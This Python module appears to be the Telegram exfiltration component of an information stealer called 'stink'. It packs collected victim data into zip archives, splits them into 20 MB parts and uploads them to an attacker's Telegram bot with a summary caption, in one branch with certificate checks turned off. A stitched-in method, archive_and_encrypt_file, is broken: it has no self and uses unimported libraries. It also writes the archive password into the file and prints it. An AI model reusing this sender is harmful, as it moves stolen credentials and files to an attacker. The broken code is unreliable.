from io import BytesIO
from typing import Tuple, Union, List
from urllib.request import Request, urlopen
import math

from stink.abstract import AbstractSender


class Telegram(AbstractSender):
    """
    Sender for the Telegram.
    """
    def __init__(self, token: str, user_id: int):
        super().__init__()

        self.__token = token
        self.__user_id = user_id
        self.__url = f"https://api.telegram.org/bot{self.__token}/sendDocument"
        self.chunk_size = 20 * 1024 * 1024  # 20 MB

    def __get_sender_data(self, part_name: str, part_data: BytesIO, caption: str) -> Tuple[Union[str, bytes], ...]:
        """
        Gets data to send for a specific part.

        Parameters:
        - part_name (str): Имя части архива.
        - part_data (BytesIO): Данные части архива.
        - caption (str): Описание файла или части архива.

        Returns:
        - tuple: A tuple of content type, body, and Telegram API URL.
        """
        content_type, body = self._encoder.encode(
            [("chat_id", self.__user_id), ("caption", caption)],
            [("document", part_name, part_data)]
        )

        return content_type, body

    def __send_archive_part(self, part_name: str, part_data: BytesIO, caption: str) -> None:
        """
        Sends a part of the archive.

        Parameters:
        - part_name (str): The name of the archive part.
        - part_data (BytesIO): The data of the archive part.
        - caption (str): The caption to send with the part.

        Returns:
        - None.
        """
        content_type, body = self.__get_sender_data(part_name, part_data, caption)
        query = Request(method="POST", url=self.__url, data=body)

        query.add_header("User-Agent", self._config.UserAgent)
        query.add_header("Content-Type", content_type)

        urlopen(query)

    def __split_into_parts(self, data: BytesIO) -> List[BytesIO]:
        """
        Splits the archive into 20MB parts.

        Parameters:
        - data (BytesIO): The full archive data.

        Returns:
        - List[BytesIO]: List of BytesIO objects, each containing a part of the archive.
        """
        parts = []
        total_size = len(data.getvalue())
        num_parts = math.ceil(total_size / self.chunk_size)

        data.seek(0)

        for i in range(num_parts):
            part = BytesIO(data.read(self.chunk_size))
            parts.append(part)

        return parts

    def archive_and_encrypt_file(file_path, zip_path, password, volume_size_mb=5):
        if not os.path.exists(file_path):
            print(f"Файл {file_path} не найден.")
            return

        try:
            # Получаем размер файла в байтах
            file_size = os.path.getsize(file_path)

            # Конвертируем размер тома из МБ в байты
            volume_size = volume_size_mb * 1024 * 1024

            # Получаем директорию и имя файла архива
            zip_dir, zip_name = os.path.split(zip_path)

            # Уровень сжатия (0-9)
            compression_level = 5

            # Если файл больше заданного размера, используем многотомный архив
            if file_size > volume_size:
                # Создаем временный архив
                temp_zip = os.path.join(zip_dir, "temp.zip")
                pyminizip.compress(file_path, None, temp_zip, password, compression_level)

                # Читаем временный архив и разделяем на тома
                with open(temp_zip, 'rb') as f:
                    data = f.read()

                # Удаляем временный архив
                os.remove(temp_zip)
                print(temp_zip)

                # Создаем тома
                for i, chunk in enumerate(range(0, len(data), volume_size)):
                    volume_name = f"{zip_path}.{i + 1:03d}"
                    with open(volume_name, 'wb') as f:
                        f.write(data[chunk:chunk + volume_size])

                    # Добавляем пароль в конец последнего тома
                    if i == (len(range(0, len(data), volume_size)) - 1):
                        with open(volume_name, 'ab') as f:
                            f.write(b'' + password.encode())
                    print(f"[Telegram sender]: Сгенерирован пароль для шифрования: {password}")
                    print(base64.b64encode(password.encode()).decode())

                    print(f"Создан том: {volume_name}")

                print(f"Файл успешно заархивирован и зашифрован в многотомный архив.")
            else:
                # Создаем обычный зашифрованный архив
                pyminizip.compress(file_path, None, zip_path, password, compression_level)

                # Добавляем пароль в конец архива
                with open(zip_path, 'ab') as f:
                    f.write(b'\n' + password.encode())

                print(f"Файл успешно заархивирован и зашифрован: {zip_path}")

        except Exception as e:
            print(f"Произошла ошибка при архивировании и шифровании: {str(e)}")

    def run(self, zip_name: str, data: BytesIO, preview: str) -> None:
        """
        Launches the sender module.

        Parameters:
        - zip_name [str]: Archive name.
        - data [BytesIO]: BytesIO object with archive data.
        - preview [str]: Collected data summary.

        Returns:
        - None.
        """
        self.__zip_name = zip_name
        self.__data = data
        self.__preview = preview

        try:
            # Вывод размера zip архива перед отправкой
            zip_size = len(self.__data.getvalue())
            print(f"[Telegram sender]: Размер zip архива {self.__zip_name}.zip: {zip_size} байт")

            # Проверяем, нужно ли делить на части
            if zip_size > self.chunk_size:
                print(f"[Telegram sender]: Архив превышает 20MB, разбиваем на части...")
                parts = self.__split_into_parts(self.__data)

                # Отправляем каждую часть отдельно с информацией
                for idx, part in enumerate(parts):
                    part_name = f"{self.__zip_name}_part{idx + 1}.zip"
                    caption = f"{self.__preview}\nЧасть {idx + 1} из {len(parts)}"
                    print(f"[Telegram sender]: Отправка части: {part_name}, размер: {len(part.getvalue())} байт")
                    self.__send_archive_part(part_name, part, caption)
            else:
                # Если архив не превышает 20MB, отправляем его как один файл с информацией
                self._create_unverified_https()
                self.__send_archive_part(f"{self.__zip_name}.zip", self.__data, self.__preview)

        except Exception as e:
            print(f"[Telegram sender]: {repr(e)}")
